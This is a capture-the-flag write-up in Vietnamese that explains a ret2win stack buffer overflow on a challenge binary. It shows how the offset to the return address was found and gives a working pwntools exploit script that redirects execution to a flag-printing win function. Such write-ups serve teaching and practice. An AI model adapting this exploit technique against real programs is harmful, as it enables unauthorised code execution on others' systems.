### Write up strstr 
Với bài này em overflow nhẹ nhẹ và nó dump, tức là có lỗi buffer overflow, tràn lên return nên core nó dump 

![image](https://github.com/antkss/writeUP/assets/88892713/d46a4ff8-004d-456e-82ea-ad608f6a9c6f)



check ida, phát hiện hàm này để lấy flag

```c++
int win()
{
  return system("cat flag.txt");
}
```

bây h em tìm offset từ lúc mà em nhập dữ liệu tới return 


![image](https://github.com/antkss/writeUP/assets/88892713/08069853-234a-4b09-82d2-08731417b5d5)


đây chính là địa chỉ lúc nhập dữ liệu 
```c++
$rsi = 0x00007fffffffe5d0
```
nhìn vào ta thấy, đây là địa chỉ của return "0x00007fffffffe608"


![image](https://github.com/antkss/writeUP/assets/88892713/4351b5a1-8054-4402-9f9a-7618275e8567)

lấy địa chỉ return trừ địa chỉ từ lúc nhập dữ liệu là ra offset 


![image](https://github.com/antkss/writeUP/assets/88892713/6ca8e5a2-6692-4948-9f7a-e51c8a68448f)


tiếp theo là viết script đề nó return to win, lấp đầy dữ liệu của các địa chỉ trước đó bằng 56 chữ a và cuối cùng địa chỉ của hàm win sẽ nằm ở return 

```python
#!/usr/bin/python3

from pwn import *

context.binary=exe=ELF('./chall', checksec=False)
p = process('./chall')
#p=process(exe.path)
#input()
payload = b'A'*56
payload += p64(exe.sym['win']+1)
p.sendafter(b's play', payload)

p.interactive()

```
flag đã được lấy ra 


![image](https://github.com/antkss/writeUP/assets/88892713/b863cc69-aabd-4564-82f2-2c542c6869ab)
